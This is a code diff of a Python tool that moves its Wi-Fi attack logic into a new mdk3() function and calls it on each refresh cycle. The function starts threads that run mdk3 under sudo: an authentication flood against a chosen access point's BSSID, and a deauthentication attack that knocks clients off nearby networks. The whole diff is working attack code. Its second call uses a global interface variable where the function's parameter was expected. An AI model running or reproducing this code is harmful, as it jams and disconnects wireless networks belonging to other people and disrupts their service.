@@ -49,6 +49,40 @@ def sleep(seconds: float, /):
             time.sleep(0.2)
 
 
+def mdk3(interface: str, bssid: str) -> None:
+    logger.info("Starting the <b>mdk3</b> sub processe(s)...")
+    threading.Thread(
+        target=subprocess.run,
+        args=(
+            [
+                "sudo",
+                "mdk3",
+                interface,
+                "a",
+                "-a",
+                bssid,
+                "-c",
+                "-m",
+            ],
+        ),
+        kwargs={
+            "capture_output": True,
+            "text": True,
+            "check": False,
+        },
+    ).start()
+
+    threading.Thread(
+        target=subprocess.run,
+        args=(["sudo", "mdk3", _interface, "d"],),
+        kwargs={
+            "capture_output": True,
+            "text": True,
+            "check": False,
+        },
+    ).start()
+
+
 def change_interface_status(interface: str, status: Literal["up", "down"]):
     p = subprocess.run(
         ["sudo", "ip", "link", "set", interface, f"{status}"],
@@ -149,38 +183,6 @@ class Target:
 
                 change_interface_type(_interface, "monitor")
                 change_interface_channel(_interface, self.channel)
-
-                logger.info("Starting the <b>mdk3</b> sub processe(s)...")
-                threading.Thread(
-                    target=subprocess.run,
-                    args=(
-                        [
-                            "sudo",
-                            "mdk3",
-                            _interface,
-                            "a",
-                            "-a",
-                            self.bssid,
-                            "-c",
-                            "-m",
-                        ],
-                    ),
-                    kwargs={
-                        "capture_output": True,
-                        "text": True,
-                        "check": False,
-                    },
-                ).start()
-
-                threading.Thread(
-                    target=subprocess.run,
-                    args=(["sudo", "mdk3", _interface, "d"],),
-                    kwargs={
-                        "capture_output": True,
-                        "text": True,
-                        "check": False,
-                    },
-                ).start()
 
         return super().__setattr__(name, value)
 
@@ -293,6 +295,8 @@ def refresh():
 
                 Target.obj.ssid = ssid
                 Target.obj.channel = channel
+
+                mdk3(_interface, Target.obj.bssid)
 
                 logger.info(f"Sleep {_interval} for seconds.")
                 sleep(_interval)
